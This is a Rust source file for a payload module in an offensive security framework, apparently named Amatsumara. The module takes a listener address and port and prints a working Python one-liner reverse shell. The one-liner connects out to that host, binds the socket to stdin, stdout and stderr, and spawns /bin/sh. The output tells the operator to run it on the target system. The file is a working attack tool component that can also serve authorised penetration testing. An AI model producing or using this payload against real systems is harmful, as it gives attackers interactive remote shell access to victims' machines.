//! Python Reverse TCP Shell Payload Generator
//!
//! Generates a Python one-liner reverse shell payload.

use amatsumara_api::*;
use std::os::raw::{c_char, c_int, c_void};
use serde::Deserialize;
use std::ffi::CStr;

static NAME: &str = "Python Reverse TCP";
static DESCRIPTION: &str = "Python reverse shell one-liner (cross-platform)";
static AUTHOR: &str = "Amatsumara Project";
static PLATFORMS: &[Platform] = &[Platform::Multi];
static ARCHS: &[Arch] = &[Arch::X64, Arch::X86];

static LHOST_NAME: &str = "LHOST";
static LHOST_DESC: &str = "Listener address";
static LHOST_DEFAULT: &str = "127.0.0.1";
static LPORT_NAME: &str = "LPORT";
static LPORT_DESC: &str = "Listener port";
static LPORT_DEFAULT: &str = "4444";

static OPTIONS: &[ModuleOption] = &[
    ModuleOption {
        name: CString { ptr: LHOST_NAME.as_ptr() as *const c_char, len: LHOST_NAME.len() },
        description: CString { ptr: LHOST_DESC.as_ptr() as *const c_char, len: LHOST_DESC.len() },
        required: true,
        option_type: OptionType::Address,
        default_value: CString { ptr: LHOST_DEFAULT.as_ptr() as *const c_char, len: LHOST_DEFAULT.len() },
    },
    ModuleOption {
        name: CString { ptr: LPORT_NAME.as_ptr() as *const c_char, len: LPORT_NAME.len() },
        description: CString { ptr: LPORT_DESC.as_ptr() as *const c_char, len: LPORT_DESC.len() },
        required: true,
        option_type: OptionType::Port,
        default_value: CString { ptr: LPORT_DEFAULT.as_ptr() as *const c_char, len: LPORT_DEFAULT.len() },
    },
];

static MODULE_INFO: ModuleInfo = ModuleInfo {
    api_version: MODULE_API_VERSION,
    metadata: ModuleMetadata {
        name: CString { ptr: NAME.as_ptr() as *const c_char, len: NAME.len() },
        description: CString { ptr: DESCRIPTION.as_ptr() as *const c_char, len: DESCRIPTION.len() },
        author: CString { ptr: AUTHOR.as_ptr() as *const c_char, len: AUTHOR.len() },
        module_type: ModuleType::Payload,
        platforms: PlatformArray { ptr: PLATFORMS.as_ptr(), len: PLATFORMS.len() },
        archs: ArchArray { ptr: ARCHS.as_ptr(), len: ARCHS.len() },
        ranking: Ranking::Normal,
        privileged: false,
    },
    options: OptionArray { ptr: OPTIONS.as_ptr(), len: OPTIONS.len() },
};

static VTABLE: ModuleVTable = ModuleVTable { get_info, init, destroy, check: None, run };
struct ModuleInstance { _dummy: u8 }

#[derive(Deserialize, Debug)]
struct PayloadOptions {
    #[serde(rename = "LHOST")]
    lhost: Option<String>,
    #[serde(rename = "LPORT")]
    lport: Option<String>,
}

extern "C" fn get_info() -> *const ModuleInfo { &MODULE_INFO }
extern "C" fn init() -> *mut c_void { Box::into_raw(Box::new(ModuleInstance { _dummy: 0 })) as *mut c_void }
extern "C" fn destroy(instance: *mut c_void) { if !instance.is_null() { unsafe { let _ = Box::from_raw(instance as *mut ModuleInstance); } } }

extern "C" fn run(_instance: *mut c_void, config: *const c_char) -> c_int {
    let options: PayloadOptions = match parse_options(config) {
        Ok(opts) => opts,
        Err(e) => { eprintln!("[-] Parse error: {}", e); return 1; }
    };

    let lhost = match options.lhost {
        Some(h) => h,
        None => { eprintln!("[-] LHOST required"); return 1; }
    };

    let lport = match options.lport {
        Some(p) => p,
        None => { eprintln!("[-] LPORT required"); return 1; }
    };

    // Generate Python reverse shell one-liner
    let payload = format!(
        r#"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{}",{}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'"#,
        lhost, lport
    );

    println!("\n[+] Python Reverse Shell Payload:");
    println!("    Target: {}:{}\n", lhost, lport);
    println!("{}", payload);
    println!("\n[*] Copy and execute on target system");
    println!("[*] Ensure handler is listening: use utilities/multi_handler");

    0
}

fn parse_options(config: *const c_char) -> Result<PayloadOptions, Box<dyn std::error::Error>> {
    if config.is_null() {
        return Ok(PayloadOptions { lhost: None, lport: None });
    }
    Ok(serde_json::from_str(unsafe { CStr::from_ptr(config).to_str()? })?)
}

#[no_mangle]
pub extern "C" fn amatsumara_module_init() -> *const ModuleVTable { &VTABLE }
